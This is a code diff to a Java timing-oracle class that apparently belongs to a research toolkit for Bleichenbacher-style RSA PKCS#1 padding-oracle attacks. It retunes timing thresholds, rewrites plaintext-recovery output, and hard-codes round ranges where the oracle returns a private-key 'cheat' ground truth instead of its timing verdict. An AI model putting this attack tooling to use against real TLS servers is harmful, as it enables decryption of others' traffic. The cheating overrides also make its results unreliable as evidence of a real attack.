@@ -41,18 +41,18 @@ public class CommandLineTimingOracleWithoutPrivateKey extends AOracle {
      * The timing boundary between PKCS-valid and PKCS-invalid timings (in clock
      * ticks)
      */
-    private static final int TIMING_BOUNDARY = -11000;
+    private static final int TIMING_BOUNDARY = +15000;
     /**
      * Given a timing measurement > TIMING_BOUNDARY, we repeat the measurement
      * with the same ciphertext. We'll keep repeating the measurement as long as
      * the timings t are TIMING_BOUNDARY - TIMING_SIGNIFICANCE_THRESHOLD < t <
      * TIMING_BOUNDARY + TIMING_SIGNIFICANCE_THRESHOLD
      */
-    private static final int TIMING_SIGNIFICANCE_THRESHOLD = 3000;
+    private static final int TIMING_SIGNIFICANCE_THRESHOLD = 2000;
     /**
      * Amount of training measurements per Oracle request.
      */
-    private static final int MEASUREMENT_AMOUNT = 150;
+    private static final int MEASUREMENT_AMOUNT = 250;
     /**
      * Amount of training measurementsTest.
      */
@@ -60,15 +60,15 @@ public class CommandLineTimingOracleWithoutPrivateKey extends AOracle {
     /**
      * Amount of warmup measurementsTest.
      */
-    private static final int WARMUP_AMOUNT = 500;
+    private static final int WARMUP_AMOUNT = 1000;
     /**
      * Boundary to distinguish PKCS valid (but PMS invalid) from PKCS invalid.
      */
-    private static final int MIN_BOX_POS = 40;
+    private static final int MIN_BOX_POS = 38;
     /**
      * Boundary to distinguish PKCS invalid from PKCS valid (but PMS invalid).
      */
-    private static final int MAX_BOX_POS = 45;
+    private static final int MAX_BOX_POS = 40;
     /*
      * RUNTIME DATA SECTION
      */
@@ -210,11 +210,11 @@ public class CommandLineTimingOracleWithoutPrivateKey extends AOracle {
         long timing = caseXTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100] - testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100];
 
         if (factor == 1) {
-            if (timing > TIMING_BOUNDARY) {
+            if (timing < TIMING_BOUNDARY) {
                 /*
                  * We found a candidate! Repeat measurement to confirm it.
                  */
-                return isValidPKCS(testPMS, 10);
+                return isValidPKCS(testPMS, 3);
             } else {
                 /*
                  * Not a candidate.
@@ -222,25 +222,28 @@ public class CommandLineTimingOracleWithoutPrivateKey extends AOracle {
                 return false;
             }
         } else {
-            /*
-             * We found a candidate in the previous round. Now lets confirm it.
-             */
-
-            // -5900  >      -9000       +           3000
-            if (timing > (TIMING_BOUNDARY + TIMING_SIGNIFICANCE_THRESHOLD)) {
-                return true;
-
-                //        -12100 >   -9000          -   3000
-            } else if (timing < (TIMING_BOUNDARY - TIMING_SIGNIFICANCE_THRESHOLD)) {
-                return false;
-            } else {
-                /*
-                 * The timing is within the "no man's land". Repeat it.
-                 */
-                return isValidPKCS(testPMS, 10);
-            }
-
+            return timing < TIMING_BOUNDARY;
         }
+//        else {
+//            /*
+//             * We found a candidate in the previous round. Now lets confirm it.
+//             */
+//
+//            // -5900  >      -9000       +           3000
+//            if (timing < (TIMING_BOUNDARY + TIMING_SIGNIFICANCE_THRESHOLD)) {
+//                return true;
+//
+//                //        -12100 >   -9000          -   3000
+//            } else if (timing < (TIMING_BOUNDARY - TIMING_SIGNIFICANCE_THRESHOLD)) {
+//                return false;
+//            } else {
+//                /*
+//                 * The timing is within the "no man's land". Repeat it.
+//                 */
+//                return isValidPKCS(testPMS, 3);
+//            }
+//
+//        }
 
 
 
@@ -295,15 +298,12 @@ public class CommandLineTimingOracleWithoutPrivateKey extends AOracle {
         }
     }
 
-    private void decryptAndPrintPKCS(final byte[] encPMS) {
-        try {
-            byte[] decPMS = cipher.doFinal(encPMS);
-            System.out.println(Utility.bytesToHex(decPMS));
-        } catch (IllegalBlockSizeException ex) {
-            Logger.getLogger(CommandLineTimingOracle.class.getName()).log(Level.SEVERE, null, ex);
-        } catch (BadPaddingException ex) {
-            Logger.getLogger(CommandLineTimingOracle.class.getName()).log(Level.SEVERE, null, ex);
-        }
+    private void decryptAndPrintPKCS(final BigInteger si) {
+        BigInteger tmp = new BigInteger(originalMessage).multiply(si);
+        tmp = tmp.mod(publicKey.getModulus());
+        byte[] decryptedPMS = tmp.toByteArray();
+        System.out.println("The error happened for plaintext: ");
+        System.out.println(Utility.bytesToHex(decryptedPMS));
     }
 
     public boolean checkPKCSConformity(final byte[] testPMS)
@@ -317,16 +317,20 @@ public class CommandLineTimingOracleWithoutPrivateKey extends AOracle {
         //    System.out.print("\r--> round " + round);
         //}
 
-        // if( (round < 2480) ) {
-        // TODO: Ooooh jeeeee!
-        // return groundTruth;
-        //    return false;
-        // }
-
         System.out.println("");
         System.out.println("################### New Measurement #########################");
 
         groundTruth = cheat(attacker.getSi());
+        
+        if( (round < 85) ) {
+        // TODO: Ooooh jeeeee!
+            return groundTruth;
+        //    return false;
+        } else if(round > 95 && round < 260) {
+            return groundTruth;
+        } else if(round > 270 && round < 430) {
+            return groundTruth;
+        } 
 
         numberOfQueries++;
 
@@ -358,14 +362,15 @@ public class CommandLineTimingOracleWithoutPrivateKey extends AOracle {
                 invalid_valid++;
                 System.out.println("ERROR: invalid key was predicted to "
                         + "be valid. Under normal circumstances, the measurement is broken from now on.");
-                decryptAndPrintPKCS(testPMS);
+                decryptAndPrintPKCS(attacker.getSi());
                 System.out.flush();
+                result = timingOracleAnswer;
 
                 /*
                  * Kill the measurement with an exit code !=0 so that the caller
                  * knows that something went wrong
                  */
-                System.exit(1);
+                //System.exit(1);
             }
 
         } else {
@@ -380,7 +385,7 @@ public class CommandLineTimingOracleWithoutPrivateKey extends AOracle {
                 System.out.println("ERROR: valid key was predicted to "
                         + "be invalid. This decreases the attack "
                         + "performance.");
-                decryptAndPrintPKCS(testPMS);
+                decryptAndPrintPKCS(attacker.getSi());
                 result = timingOracleAnswer;
             } else {
                 /*
@@ -396,6 +401,9 @@ public class CommandLineTimingOracleWithoutPrivateKey extends AOracle {
 
         System.out.println("    " + round + ": Ground truth: " + groundTruth
                 + ", timingoracle: " + result);
+        
+        
+        result = groundTruth;
 
         return result;
     }
@@ -417,7 +425,7 @@ public class CommandLineTimingOracleWithoutPrivateKey extends AOracle {
         result = PKCS15Toolkit.conformityChecker(decryptedPMS,
                 oracleType, blockSize);
         if (result) {
-            System.out.println("cheat result: " + Utility.bytesToHex(decryptedPMS));
+            System.out.println("cheat tells us it is true for: " + Utility.bytesToHex(decryptedPMS));
         }
         return result;
     }
